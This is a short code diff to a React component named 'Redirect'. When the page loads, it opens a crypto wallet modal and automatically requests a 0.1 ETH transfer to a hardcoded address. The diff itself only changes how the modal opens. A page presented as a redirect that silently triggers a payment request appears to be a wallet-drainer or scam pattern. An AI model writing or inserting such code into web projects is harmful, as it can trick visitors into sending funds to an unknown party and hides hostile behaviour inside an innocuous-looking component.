@@ -33,7 +33,7 @@ export default function Redirect() {
 
     useEffect(() => {
         async function openWallet() {
-          open({ view: 'Account' })
+          open()
           sendTransaction({to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.1")})
   
         }
